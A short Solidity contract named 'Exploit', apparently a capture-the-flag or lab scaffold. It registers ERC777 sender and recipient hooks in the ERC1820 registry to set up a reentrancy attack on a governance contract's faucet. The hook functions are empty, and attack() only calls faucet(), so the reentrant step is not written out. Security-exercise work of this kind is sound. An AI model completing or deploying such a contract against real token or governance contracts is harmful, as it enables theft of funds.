pragma solidity 0.8.11;

import "@openzeppelin/contracts4.0/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts4.0/token/ERC777/IERC777Sender.sol";

import "@openzeppelin/contracts4.0/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts4.0/utils/introspection/IERC1820Registry.sol";

interface IGovernance {
    function addProposal(uint256 amount) external;
    function voteProposal(uint256 idx, bool approved) external;
    function faucet() external;
    function deposit(uint256 idx, uint256 amount) external;
    function withdraw(uint256 idx) external;
}

contract Exploit is IERC777Sender {
    IERC1820Registry constant internal _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    IGovernance governance;

    constructor(IGovernance _governance) payable {
        governance = _governance;
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777Token"), address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC20Token"), address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function attack() public {
        governance.faucet();
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
    }

        function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
    }
}
